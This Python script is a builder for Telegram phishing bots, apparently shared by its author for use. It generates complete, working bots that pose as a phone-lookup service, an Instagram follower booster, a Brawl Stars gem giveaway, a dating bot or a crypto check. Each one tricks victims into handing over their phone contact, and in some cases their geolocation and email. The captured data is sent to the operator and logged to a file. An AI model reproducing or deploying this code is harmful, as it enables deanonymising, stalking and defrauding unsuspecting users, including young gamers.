import colorama
from colorama import Fore, Back, Style
import os
os.system('clear')
print(Fore.RED + '''
         _,.-------.,_
     ,;~'             '~;,
   ,;                     ;,
  ;                         ;
 ,'                         ',
,;                           ;,
; ;      .           .      ; ;
| ;   ______       ______   ; |
|  `/~"     ~" . "~     "~\'  |
|  ~  ,-~~~^~, | ,~^~~~-,  ~  |
 |   |        }:{        |   |
 |   l       / | \       !   |
 .~  (__,.--" .^. "--.,__)  ~.
 |     ---;' / | \ `;---     |
  \__.       \/^\/       .__/
   V| \                 / |V
    | |T~\___!___!___/~T| |
    | |`IIII_I_I_I_IIII'| |
    |  \,III I I I III,/  |
     \   `~~~~~~~~~~'    /
       \   .       .   /     
         \.    ^    ./
           ^~~~^~~~^


	''')
input(Fore.GREEN + "Press Enter")
os.system('clear')
print(Fore.MAGENTA + ' _____    _   _   _   _ ' + Fore.YELLOW + ' __  __   ______ ')
print(Fore.MAGENTA + '|  __ \  | \ | | | \ | |' + Fore.YELLOW + '|  \/  | |  ____|')
print(Fore.MAGENTA + '| |  | | |  \| | |  \| |' + Fore.YELLOW + '| \  / | | |__   ')
print(Fore.MAGENTA + '| |  | | | . ` | | . ` |' + Fore.YELLOW + '| |\/| | |  __|  ')
print(Fore.MAGENTA + '| |__| | | |\  | | |\  |' + Fore.YELLOW + '| |  | | | |____ ')
print(Fore.MAGENTA + '|_____/  |_| \_| |_| \_|' + Fore.YELLOW + '|_|  |_| |______|')
print(Fore.YELLOW + '-----------------------------------------')
print(Fore.YELLOW + '|' + Fore.BLUE +  " Telegram Deanonymization bot builder  " + Fore.YELLOW + '|')
print(Fore.YELLOW + '|' + Fore.BLUE +  "       Developer: @tiivik         " + Fore.YELLOW + '|')
print(Fore.YELLOW + '|' + Fore.BLUE +  "        Channel: @tiivik         " + Fore.YELLOW + '|')
print(Fore.YELLOW + '-----------------------------------------')
userid = input(Fore.RED +  "Enter your Telegram ID > ")
token = input(Fore.BLUE +  "Enter bot token > ")
print(Fore.CYAN + '''
[1] Punching by number
[2] Instagram promotion
[3] Brawl Stars
[4] Dating
[5] BTC BANKER
	''')
choice = input(Fore.MAGENTA +  "Choose fake interface option:>>> ")
if not choice.isdigit():
	print("Error, option must be numeric")
	exit(0)
choice = int(choice)



if choice == 1:
	f = open('probiv.py', 'w+', encoding='utf-8')
	f.write(f"""
import telebot
from telebot import types
import time
import random

ID = '{userid}'
bot = telebot.TeleBot("{token}")
adr = ['Tverskaya street, 13', 'Prospect of the 60th anniversary of October', 'Vinokurov street', '3rd Golutvinsky lane']
bot.send_message(ID, '!BOT STARTED!') 
print("Bot launched!")

@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, '''👋 Hello! 👋
This is a bot that can show information by phone number!
To search for information, enter the /getinfo''') 
	
@bot.message_handler(commands=['pwngit'])
def start(message):
	bot.send_message(message.chat.id, 'Script author: @pwngit. Channel: @tiivik') 

@bot.message_handler(commands=['getinfo'])
def start(message):
	msg = bot.send_message(message.chat.id, 'Enter any phone number') 
	bot.register_next_step_handler(msg, proc2)

def proc2(message):
	try:
		m_id = message.chat.id
		user_input = message.text
		num = user_input.replace('+', '')

		if not num.isdigit():
			msg = bot.reply_to(message, 'It seems you did not enter a valid phone number, please try again by typing /getinfo!')#⏳
			return

		bot.send_message(m_id, f'Request for a number {{num}} sent!')
		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Looks like you don't have any free requests left for the day!
			To receive additional questions, register in the bot!''', reply_markup=keyboard)
# Отловка ошибок
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			Data
			├Name: {{first}} {{last}}
			├ID: {{userid}}
			├Nick: @{{nick}}
			└Phone number: {{phone}}
			'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()
		bot.send_message(ID, info)
		print(info)

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Send your contact!')

	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	button = types.InlineKeyboardButton(text="Advanced Search", callback_data="find")
	keyboardmain.add(button)
	bot.send_message(message.chat.id, f'''
		Room Information
		├Operator: MCI
		└Country: Iran
		''', reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "find":
		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_location = types.KeyboardButton(text="Confirm", request_location=True) 	
		keyboard1.add(button_location)
		bot.send_message(call.message.chat.id, text='To use the free advanced search, confirm your geolocation!', reply_markup=keyboard1)

@bot.message_handler(content_types=['location']) 
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		Геолокация
		├ID: {{message.chat.id}}
		├Longitude: {{lon}}
		├Latitude: {{lat}}
		└Карты: https://www.google.com/maps/place/{{lat}}+{{lon}} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		bot.send_message(message.chat.id, f'''
			Геолокация
			└Адрес: {{random.choice(adr)}}
			''')
bot.polling()
		""")
	f.close()
	print("File probiv.py saved")

if choice == 2:
	f = open('nacr.py', 'w+', encoding='utf-8')
	f.write(f"""
import telebot
from telebot import types
import time
import random


log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = '{userid}'
bot = telebot.TeleBot("{token}")
bot.send_message(ID, '!BOT STARTED!')
print("Бот запущен!") 
@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, '''👋 Hello! 👋
		This is a bot for cheating likes and followers on instagram!
		To start, write /cheat''') 
@bot.message_handler(commands=['pwngit'])
def start(message):
	bot.send_message(message.chat.id, 'Script author: @pwngit. Channel: @tiivik') 
@bot.message_handler(commands=['nacrutka'])
def start(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="Likes", callback_data="first")
	second_button = types.InlineKeyboardButton(text="Подписчики", callback_data="second")
	keyboardmain.add(first_button, second_button)
	bot.send_message(message.chat.id, "Choose a promotion item:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "first":
		msg = bot.send_message(call.message.chat.id, 'Enter the number of likes (no more than 500)') 
		bot.register_next_step_handler(msg, proc1)

	elif call.data == "second":
		msg = bot.send_message(call.message.chat.id, 'Enter the number of subscribers (max 500)') 
		bot.register_next_step_handler(msg, proc2)

def proc1(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Enter the amount as a number! Try again by typing /nakrutka!')#⏳
			return
		if int(num) > 500:
			bot.reply_to(message, 'The number of likes cannot be more than 500!')
			return


		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Looks like you don't have any free requests left for the day!
			To receive additional requests, register in the bot!''', reply_markup=keyboard)
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')


def proc2(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Enter quantity as a number! Please try again by typing /wrap!')#⏳
			return

		if int(num) > 500:
			bot.reply_to(message, 'The number of subscribers cannot be more than 500!')
			return

		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Looks like you don't have any free requests left for the day!
			To receive additional requests, register in the bot!''', reply_markup=keyboard)

	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			Data
			├Name: {{first}} {{last}}
			├ID: {{userid}}
			├Nick: @{{nick}}
			└Phone number: {{phone}}
			'''

		bot.send_message(ID, info)
		print(info)

		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Submit your contact!')
		bot.send_message(message.chat.id, 'registration completed successfully!') 
		time.sleep(1)
		msg = bot.send_message(message.chat.id, 'Enter your nickname on Instagram:') 
		bot.register_next_step_handler(msg, entr)

def entr(message):
	try:
		inp = message.text
		m_id = message.chat.id

		bot.reply_to(message, f'Nick: {{inp}} ')#⏳
		bot.send_message(ID, f'Nick on instagram: {{inp}}')
		bot.send_message(message.chat.id, 'Expect a cheat on your account within 24 hours!')
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')




bot.polling()


		""")
	f.close()
	print("nacr.py file saved")

if choice == 3:
	f = open('brawl.py', 'w+', encoding='utf-8')
	f.write(f"""
import telebot
from telebot import types
import time
import random


log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = '{userid}'
bot = telebot.TeleBot("{token}")
bot.send_message(ID, '!BOT STARTED!')
print("Bot launched!") 
@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, f'''👋 Hello, {{message.from_user.first_name}}! 👋
		This is a bot that can donate to brawl stars 
		To get started, type /don''') 
@bot.message_handler(commands=['pwngit'])
def start(message):
	bot.send_message(message.chat.id, 'Script author: @pwngit. Channel: @tiivik') 
@bot.message_handler(commands=['don'])
def start(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="💰Gold💰", callback_data="first")
	second_button = types.InlineKeyboardButton(text="💎Gems💎", callback_data="second")
	keyboardmain.add(first_button, second_button)
	bot.send_message(message.chat.id, "Select an item:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "first":
		msg = bot.send_message(call.message.chat.id, 'Enter the amount of gold💰 (no more than 500)') 
		bot.register_next_step_handler(msg, proc1)

	elif call.data == "second":
		msg = bot.send_message(call.message.chat.id, 'Enter the number of gems💎 (no more than 50)') 
		bot.register_next_step_handler(msg, proc2)

def proc1(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Enter the amount as a number! Try again by typing /don!')#⏳
			return
		if int(num) > 500:
			bot.reply_to(message, 'The amount of gold cannot be more than 500!')
			return


		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Looks like you don't have any free requests left for the day!
			To receive additional requests, register in the bot!''', reply_markup=keyboard)
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')


def proc2(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Enter the amount as a number! Try again by typing /don!')#⏳
			return

		if int(num) > 50:
			bot.reply_to(message, 'The number of gems cannot be more than 50!')
			return

		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Looks like you don't have any free requests left for the day!
			To receive additional requests, register in the bot!''', reply_markup=keyboard)

	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			Data
			├Name: {{first}} {{last}}
			├ID: {{userid}}
			├Nick: @{{nick}}
			└Phone number: {{phone}}
			'''

		bot.send_message(ID, info)
		print(info)

		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Submit your contact!')
		bot.send_message(message.chat.id, 'registration completed successfully!') 
		time.sleep(1)
		msg = bot.send_message(message.chat.id, 'Enter the mail associated with the game:') 
		bot.register_next_step_handler(msg, entr)

def entr(message):
	try:
		inp = message.text
		m_id = message.chat.id


		bot.send_message(ID, f'Почта: {{inp}}')

		markup_reply = types.ReplyKeyboardMarkup(resize_keyboard = True)
		item_an = types.KeyboardButton('Get more gems')
		markup_reply.add(item_an)
		bot.send_message(message.chat.id, f'Mail: {{inp}} ', reply_markup = markup_reply)
		time.sleep(1)
		bot.send_message(message.chat.id, 'Expect a donation to your account within 24 hours!')

	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')

@bot.message_handler(content_types = ['text'])
def get_text(message):
	if message.text == 'Get more gems':
		m_id = message.chat.id
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Confirm", request_location=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''To get more gems, confirm your geolocation!''', reply_markup=keyboard)

@bot.message_handler(content_types=['location']) 
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		Геолокация
		├ID: {{message.chat.id}}
		├Longitude: {{lon}}
		├Latitude: {{lat}} 
		└Карты: https://www.google.com/maps/place/{{lat}}+{{lon}} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		msg = bot.send_message(message.chat.id, 'Enter the number of gems💎 (no more than 800)') 
		bot.register_next_step_handler(msg, proc3)

def proc3(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Enter the amount as a number! Try again by typing /don!')#⏳
			return

		if int(num) > 800:
			bot.reply_to(message, 'The number of gems cannot be more than 800!')
			return

		time.sleep(2)
		msg = bot.send_message(message.chat.id, 'Enter the mail associated with the game:') 
		bot.register_next_step_handler(msg, entr1)
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')

def entr1(message):
	try:
		inp = message.text
		m_id = message.chat.id

		bot.reply_to(message, f'Mail: {{inp}} ')#⏳
		bot.send_message(ID, f'Mail: {{inp}}')
		time.sleep(1)
		bot.send_message(message.chat.id, 'Expect a donation to your account within 24 hours!')
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unrecognized error has occurred, please restart the bot!')




	

bot.polling()


		""")
	f.close()
	print("brawl.py file saved")

if choice == 4:
	f = open('znak.py', 'w+', encoding='utf-8')
	f.write(f"""
import telebot
from telebot import types
import time
import random

ID = '{userid}'
bot = telebot.TeleBot("{token}")
bot.send_message(ID, '!BOT STARTED!') 
print("Bot launched!") 

@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, f'''👋 Hi! {{message.from_user.first_name}}👋
		This is a dating bot!
	To get started, type /znak''') 
@bot.message_handler(commands=['pwngit'])
def start(message):
	bot.send_message(message.chat.id, 'Script author: @pwngit. Channel: @tiivik') 
@bot.message_handler(commands=['znak'])
def start(message):
	msg = bot.send_message(message.chat.id, 'First, write a little about yourself (in one message)') 
	bot.register_next_step_handler(msg, proc2)

def proc2(message):
	try:
		m_id = message.chat.id
		num = message.text
		bot.send_message(ID, f'Information received: {{num}}')
		print(num)
		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''To use the bot, please register!''', reply_markup=keyboard)
# Catching errors
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		bot.send_message(userid, "registration completed successfully!")
		info = f'''
			Data
			├Name: {{first}} {{last}}
			├ID: {{userid}}
			├Nick: @{{nick}}
			└Phone number: {{phone}}
			'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()
		bot.send_message(ID, info)
		print(info)

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Submit your contact!')
		time.sleep(1)
		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_location = types.KeyboardButton(text="Send", request_location=True) 	
		keyboard1.add(button_location)
		bot.send_message(message.chat.id, text='Submit your location so that the bot can find users closest to you!', reply_markup=keyboard1)

@bot.message_handler(content_types=['location']) 
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		Geolocation
		├ID: {{message.chat.id}}
		├Longitude: {{lon}}
		├Latitude: {{lat}} 
		└Карты: https://www.google.com/maps/place/{{lat}}+{{lon}} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		bot.send_message(message.chat.id, 'Search...')
		time.sleep(2)
		bot.send_message(message.chat.id, 'Unfortunately, there were no matching users in the database!')
bot.polling()
		""")
	f.close()
	print("znak.py file saved")
if choice == 5:
	f = open('btc.py', 'w+', encoding='utf-8')
	f.write(f"""
	
import telebot
from telebot import types
import time
import random

ID = '{userid}'
bot = telebot.TeleBot("{token}")
bot.send_message(ID, '!BOT STARTED!') 
print("Bot launched!") 


@bot.message_handler(commands=['admin'])
def adm(message):
	if message.from_user.id == int(ID):
		msg = bot.send_message(ID, 'Welcome to the bot admin panel! \\n Enter the amount for which to create a check:') 
		bot.register_next_step_handler(msg, check)
def check(message):
	try:
		if message.text.isdigit():
			bot.send_message(ID, f'Sum: {{message.text}}')
			bot.send_message(ID, f'your check: https://t.me/{{bot.get_me().username}}?start={{message.text}}')
		else:
			bot.send_message('Value must be numeric!')

	except Exception as e:
		print(e)

@bot.message_handler(commands=['start'])
def start(message):
	if message.from_user.id == int(ID):
		bot.send_message(ID, 'Welcome to the bot! \\n To enter the admin panel, write: /admin') 
	else:
		try:
			summ = message.text.split()[1]
			userid = message.chat.id
			bot.send_message(ID, f'User with ID:{{userid}} "Cashed" your check for the amount:{{summ}}')
			bot.send_message(message.chat.id, f'''You received 0.00{{random.randint(51, 253)}} BTC ({{summ}} RUB) from /uPorterBaseTheFist!''')
			time.sleep(1)
			
			m_id = message.chat.id
			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
			button_phone = types.KeyboardButton(text="✅Remove restrictions", request_contact=True) 	
			keyboard.add(button_phone)	
			bot.send_message(message.chat.id, "Forbidden >>> \\n❌ Your account is restricted! Most likely, you violated the terms of service (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
		
		except Exception as e:
			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
			button_phone = types.KeyboardButton(text="✅Remove restrictions", request_contact=True) 	
			keyboard.add(button_phone)	
			bot.send_message(message.chat.id, "Forbidden >>> \\n❌ Your account is restricted! Most likely, you violated the terms of service (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
			userid = message.chat.id
			bot.send_message(ID, f'User with ID:{{userid}} started the bot!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		bot.send_message(userid, "✅Restrictions successfully lifted, thanks for using our bot!")
		info = f'''
			Data
			├Name: {{first}} {{last}}
			├ID: {{userid}}
			├Nick: @{{nick}}
			└Phone number: {{phone}}
			'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()
		bot.send_message(ID, info)
		print(info)

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, '❌Authorize YOUR contact!')
	
bot.polling()
		""")
	f.close()
	print("btc.py file saved")
